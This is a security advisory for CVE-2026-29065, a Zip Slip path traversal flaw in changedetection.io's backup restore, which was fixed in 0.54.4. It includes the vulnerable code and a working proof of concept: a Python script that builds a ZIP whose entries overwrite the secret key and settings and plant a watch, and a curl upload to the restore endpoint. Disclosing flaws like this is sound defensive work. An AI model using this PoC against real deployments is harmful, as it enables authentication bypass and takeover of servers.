# [H] changedetection.io has Zip Slip vulnerability in the backup restore functionality

## Summary
Severity: High
Advisory: GHSA-25g8-2mcf-fcx9
CVE: CVE-2026-29065
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-25g8-2mcf-fcx9
Type: github-advisory

## Affected
- PyPI: `changedetection.io` — affected >=0 <0.54.4

## Details
### Summary
A Zip Slip vulnerability in the backup restore functionality allows arbitrary file overwrite via path traversal in uploaded ZIP archives.

### Details

A Zip Slip vulnerability in the backup restore functionality allows arbitrary file overwrite via path traversal in uploaded ZIP archives. The application uses zipfile.extractall() without validating entry paths, allowing ../ sequences to escape the extraction directory.

Vulnerable Code (lines 50-53):
```
def restore_backup(self, filename):
    with zipfile.ZipFile(filename, 'r') as zip_ref:
        # VULNERABLE: No path validation before extraction
        zip_ref.extractall(self.datastore_path)
```
The extractall() function preserves the relative paths stored within the ZIP archive. When a malicious ZIP contains entries with ../ path traversal sequences, these files are extracted outside the intended directory.

| Path in ZIP | Target File | Impact |
| --- | --- | --- |
| ../secret.txt | Flask secret key | Session forgery, auth bypass |
| ../changedetection.json | App settings | Disable password, inject backdoor |
| ../url-watches.json | Watch index | Inject malicious watches |
| ../{uuid}/watch.json | Watch config | Modify any watch |

Attacker uploads ZIP via the backup restore functionality at /backups/restore
Application extracts files without validation, writing attacker content to sensitive locations


### PoC

Step 1: Create Malicious ZIP
```
import zipfile
import json

with zipfile.ZipFile("zipslip.zip", "w") as zf:
    # Escape extraction directory with ../
    zf.writestr("../secret.txt", "ATTACKER-CONTROLLED-SECRET")
    
    zf.writestr("../changedetection.json", json.dumps({
        "settings": {"application": {"password": ""}}
    }))
    
    zf.writestr("../pwned-uuid-1234/watch.json", json.dumps({
        "url": "https://attacker.com/zipslip-pwned",
        "title": "🔴 ZIPSLIP-PROOF"
    }))
```
Step 2: Upload via Restore Endpoint

```curl -X POST "http://target:5000/backups/restore/start" \
  -F "zip_file=@zipslip.zip" \
  -F "include_watches=y" \
  -F "include_settings=y" 
  ```

###Step 3: Verify Path Traversal
### Check if watch escaped to /datastore/
###ls -la /datastore/
### Look for: pwned-uuid-1234/

### Verify in UI
```curl "http://target:5000/" | grep "ZIPSLIP"```


<img width="1920" height="1080" alt="f_cBHEuvFcXsOiI-pcj1wJ9yzKCRM" src="https://github.com/user-attachments/assets/889e7d2b-b5fe-4658-aa88-e57995860d38" />

## References
- https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-25g8-2mcf-fcx9
- https://nvd.nist.gov/vuln/detail/CVE-2026-29065
- https://github.com/dgtlmoon/changedetection.io/commit/1d7d812eb0faab37042246e2fbce04f29bb1b3aa
- https://github.com/dgtlmoon/changedetection.io
- https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4
